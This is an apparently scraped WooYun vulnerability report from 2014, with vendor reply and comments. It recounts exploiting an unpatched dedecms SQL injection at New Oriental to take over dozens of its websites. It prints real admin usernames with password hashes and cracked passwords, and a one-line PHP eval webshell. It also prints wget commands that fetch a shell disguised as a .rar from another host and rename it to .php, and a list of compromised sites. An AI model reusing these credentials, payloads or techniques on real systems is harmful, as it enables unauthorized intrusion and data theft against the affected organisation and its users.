{"id": 57508, "wybug_id": "wooyun-2014-054133", "wybug_title": "新东方一个未修复的漏洞可导致N个站点沦陷", "wybug_corp": "新东方", "wybug_author": "U神", "wybug_date": "2014-03-21 15:37", "wybug_open_date": "2014-05-05 15:37", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-03-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-03-24：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-04-03：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-04-13：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-04-23：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-05-05：\t细节向公众公开  简要描述：  详细说明：  #1.某日新东方一个漏洞对我公开了，于是测试了根本就没去修复，然后我就打算看看能不能拿下Shell，这个漏洞是dedecms的最新注入，注入出帐号密码了，整理了一下，发现居然密码123456的达到那么的多！看来你们很不注重安全！\nhttp://www.maxen.com.cn/------------>>  MaxEn|4e80a008e7b9129a330a   无解http://www.maxen.com.cn/------------>>  zhibo|ca8173d47fbf2c6dc052   zhiboccwhttp://www.maxen.com.cn/------------>>  nicole|c3949ba59abbe56e057f  123456http://www.maxen.com.cn/------------>>  jiaoxue|c3949ba59abbe56e057f 123456http://www.maxen.com.cn/------------>>  bjmaxen|c3949ba59abbe56e057f 123456http://www.maxen.com.cn/------------>>  tjmaxen|c3949ba59abbe56e057f 123456http://www.maxen.com.cn/------------>>  symaxen|c3949ba59abbe56e057f 123456http://www.maxen.com.cn/------------>>  cdmaxen|c3949ba59abbe56e057f 123456http://www.maxen.com.cn/------------>>  cqmaxen|c3949ba59abbe56e057f 123456http://www.maxen.com.cn/------------>>  gzmaxen|c3949ba59abbe56e057f 123456http://www.maxen.com.cn/------------>>  aditor|c3949ba59abbe56e057f 123456\n通过扫描器得到了后台地址就是：\nhttp://www.maxen.com.cn/dedecms/login.php\n成功进入后台如下，使用了第三个帐号权限比较大！\n\n然后通过文件管理器成功得到shell，shell地址：\nhttp://www.maxen.com.cn/plus/show.php\n如下图：\n\n#2.可是这个shell的访问目录有权限的，所以无法直接在菜刀上访问其它的目录，如下图：\n\n然后我就在想Web这个目录下应该还有网站，于是通过菜刀的终端管理，使用cd命令成功切换到web目录，再使用dir或者ls命令发现了特别多的网站！最少有30多个！当时就震惊了~\n\n然后我随便切换到了目录“book.xdf.cn”通过\"ls -l\"命令发现都有写入权限，这下好了~可以写shell了，于是我本来通过echo一句话到该目录下发现提示错误，\necho \"<?php eval ($_POST[val]); ?>\" >>c.php\n如下：\n\n为什么会这样？我不太懂Linux命令，但是我\"echo test >c.php\"却可以成功写入文件。\n\n#3.最后我想到用wget命令去下载，但是该把PHP的shell放哪里来下载呢？最后我想了一下！有办法了！就放到http://www.maxen.com.cn网站下去，于是在plus下放了一个PHP文件，后来发现！不对！这个网站会解析PHP，下载下来的只能当html来显示了！怎么办？最后想到了一个聪明的办法，先在本地建立了一个文件，写入一句话木马，然后将后缀名改为.rar的压缩包，传到该plus下目录。\n\n#4.我们的思路就是先把u.rar下载下来，这样就不会被解析了，然后通过重命名命令来将u.rar命名为u.php。先随便找了一个网站，就拿“http://answer2014.xdf.cn/”站点来说吧，通过下面几条命令成功下载下shell。\n[/neworiental/web/answer2014.xdf.cn/wwwroot/upload/]$ wget http://maxen.com.cn/plus/u.rar--2014-03-20 19:30:51--  http://maxen.com.cn/plus/u.rarResolving maxen.com.cn... 116.213.70.29Connecting to maxen.com.cn|116.213.70.29|:80... connected.HTTP request sent, awaiting response... 200 OKLength: 62 [application/x-rar-compressed]Saving to: `u.rar'     0K                                                       100% 8.45M=0s2014-03-20 19:30:51 (8.45 MB/s) - `u.rar' saved [62/62][/neworiental/web/answer2014.xdf.cn/wwwroot/upload/]$ dirblog  u.rar[/neworiental/web/answer2014.xdf.cn/wwwroot/upload/]$ mv u.rar u.php[/neworiental/web/answer2014.xdf.cn/wwwroot/upload/]$ dirblog  u.php\n\n\n   漏洞证明：  #4.最后连接该shell，成功进去了，开始我以为要每个网站都写入一遍，最后发现这个网站居然有权限跨目录！\n\nN个站点沦陷：\n10zn.sz.xdf.cn\t\t    hanjia.xdf.cn\t      qiuji.xdf.cnanswer2014.xdf.cn\t    kaixue.xdf.cn\t      search.xdf.cnaxure.test.xdf.cn\t    kouyudasai.xdf.cn\t      t.xdf.cnbaby.xdf.cn\t\t    maxen.com.cn\t      test.woxue.combaby.xdf.cn-old\t\t    misc.xdf.cn\t\t      tuan.xdf.cnbjtf.xdf.cn\t\t    new\t\t\t      ued.xdf.cnbook.xdf.cn\t\t    nginx_cache\t\t      vipwx.xdf.cncakephp1.3\t\t    paike.xdf.cn\t      whhuodong.xdf.cnchoujiang\t\t    post.xdf.cn\t\t      wwwchoujiang.gz.xdf.cn\t    proxy.fos.xdf.cn\t      www.toefljunior.com.cncollege.xdf.cn\t\t    proxy.heb.xdf.cn\t      xdf.oeeee.comcollege2\t\t    proxy.jn.xdf.cn\t      xueba.xdf.cneaccelerator_cache\t    proxy.kaoyan.xdf.cn       ying.xdf.cnforum.toefljuniorchina.com  proxy.szchoujiang.xdf.cn  yqlj.xdf.cngdxmwx.xdf.cn\t\t    proxy.xwb.pop.xdf.cn      yubook.xdf.cn\n提取下来服务器就可以被控制，服务器上有很多重要信息吧！\n\n为了证明给审核员看其它网站都有写入权限，测试了两个网站~如下证明（请记得删除）：\nhttp://baby.xdf.cn/test.phphttp://qiuji.xdf.cn/wooyun.txt\n\n\n\n\n各种数据库，可以连很多很多不同的数据库，我就不列举了~有几个有N多会员数据的~\n\n\n\n   修复方案：  PS：数据库神马的没动，文件神马的没有下载过！包括服务器都没提权，太菜了没办法！只是尝试连接了一两个数据库证明危害性，以上提到的shell地址包括测试的文件请自行删除，为的是防止运维人员再次偷懒！其它什么东西没动，切勿跨省！我是一个有道德意识的白帽子！还有我想说我好像在几个网站看到了别人的shell，请运维人员花时间去看看吧~查杀一下整站！最后想说，求一个高分rank，谢谢！   版权声明：转载请注明来源 U神@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-03-24 11:42 厂商回复： 谢谢提供消息，我们会尽快确认并修复。 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-03-21 15:57 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser 求解释，为何这个N个站点沦陷也走小的？和这个 WooYun: 一个上传点可能导致新东方内网全线沦陷  ——    \n     2014-03-21 16:06 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @U神 唉 一般很不重要的都才会放虚拟主机    \n     2014-03-21 16:54 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser 不像是虚拟机！linux的所有分区可看见，您老怎么看出是虚拟机?    \n     2014-03-21 17:00 |    \t\txsser  \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:18        | 当我又回首一切,这个世界会好吗?)\t\t \n  @U神 虚拟主机    \n     2014-03-21 17:08 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @xsser 卧槽！看错了。以为你说虚拟机！新东方厂商很厚道的，会送礼物的！到时候也送你一个！    \n     2014-03-21 17:23 |    \t\tPythonPig \t\t\t( 普通白帽子  |\t\t\t        Rank:491 漏洞数:71        | 只会简单工具的小小菜)\t\t \n  @U神 真心求带 注入 getshell啊，跟你混涨姿势~~    \n     2014-03-23 23:13 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  @新东方 目测厂商已经看了漏洞，测试文件都删了，就是那个SQL注入怎么还不修复呢？    \n     2014-03-24 11:45 |    \t\t新东方(乌云厂商)\t\t \n  @U神 谢谢，这个系统是外包商开发，已经通知相关公司修复。    \n     2014-06-10 22:10 |    \t\tredcar \t\t\t( 路人 |\t\t\t        Rank:0 漏洞数:1        | 找到组织了！)\t\t \n  mark一下    \n     2014-06-30 23:13 |    \t\tF4K3R \t\t\t( 普通白帽子  |\t\t\t        Rank:297 漏洞数:31        | 学习)\t\t \n  关于那个echo \"<?php eval ($_POST[val]); ?>\" >>c.php   遇到空格会截断！    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}